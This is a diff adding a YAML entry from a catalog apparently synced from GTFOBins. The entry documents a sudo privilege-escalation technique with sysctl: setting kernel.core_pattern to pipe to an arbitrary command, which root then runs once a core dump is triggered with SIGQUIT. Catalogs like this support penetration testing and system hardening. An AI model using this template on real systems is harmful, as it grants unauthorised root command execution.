@@ -1,0 +1,37 @@
+id: gtfobins/sysctl/command/sudo
+type: binary
+platform: linux
+name: sysctl
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: sysctl 'kernel.core_pattern=|/path/to/command'
+  comment: 'The command is executed by `root` in the background when a core dump occurs.
+
+
+    To trigger a core dump, send the `SIGQUIT` signal to a process, for example:
+
+
+    ```
+
+    sleep infinity &
+
+    kill -QUIT $!
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/sysctl/
+tags:
+- linux
+- unix
+- gtfobins
